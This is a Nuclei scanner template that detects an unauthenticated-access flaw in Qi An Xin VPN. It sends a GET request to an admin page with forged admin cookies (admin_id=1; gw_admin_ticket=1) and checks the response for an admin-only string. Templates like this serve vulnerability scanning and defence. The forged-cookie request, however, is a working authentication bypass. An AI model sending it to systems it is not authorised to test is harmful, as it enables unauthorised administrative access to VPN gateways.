id: unauthenticated-qax-vpn-access

info:
  name:  奇安信 VPN - 未授权访问
  author: wintry
  severity: critical
  description: 奇安信 VPN 存在未授权访问漏洞.
  tags: qaxvpn
  metadata:
    max-request: 1

http:
  - method: GET
    path:
      - "{{BaseURL}}/admin/group/x_group.php?id=1"
    headers:
      Cookie: admin_id=1; gw_admin_ticket=1;
    matchers:
      - type: word
        words:
          - "javascript:RemoveUserFromList()"
        part: body

